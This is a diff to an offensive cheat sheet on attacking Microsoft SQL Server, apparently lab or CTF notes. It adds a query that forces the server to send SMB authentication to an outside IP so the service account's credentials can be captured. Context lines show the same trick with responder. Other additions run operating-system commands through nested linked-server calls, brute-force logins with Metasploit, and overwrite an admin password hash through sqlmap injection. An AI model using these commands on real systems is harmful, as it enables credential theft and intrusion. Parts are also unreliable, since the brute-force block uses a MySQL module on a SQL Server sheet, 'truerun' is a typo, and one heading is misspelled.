@@ -29,8 +29,7 @@ Use `-m vert/ascii` to format the tables
 View Databases:
 
 ```bash
-1> SELECT name FROM master.dbo.sysdatabases
-2> GO
+SELECT name FROM sys.databases;
 ```
 
 Select Database:
@@ -125,6 +124,13 @@ EXEC master..xp_dirtree '\\10.10.15.65\share\'
 
 responder -I <interface>
 ```
+
+This forces SQL Server to access a UNC path, triggering outbound SMB authentication from the SQL service account.
+
+```bash
+SELECT * FROM sys.dm_os_file_exists('\\10.10.14.25\test\')
+```
+
 
 ### Identify users we can impersonate
 
@@ -223,4 +229,21 @@ Using `sp_execute_external_script` to run commands as another user:
 
 ```bash
 EXEC ('EXEC (''EXEC sp_execute_external_script @language = N''''Python'''', @script = N''''import os; os.system("whoami")'''';'') AT [local_server];') AT [remote_server];
+```
+
+Brute Force
+
+```bash
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS target.com
+set USER_FILE users.txt
+set PASS_FILE passwords.txt
+set STOP_ON_SUCCESS truerun
+```
+
+
+Upldat
+
+```bash
+sqlmap -r ../search.txt --sql-query="UPDATE omrsdb.tbladmin SET Password='5f4dcc3b5aa765d61d8327deb882cf99' WHERE ID=1" --batch
 ```
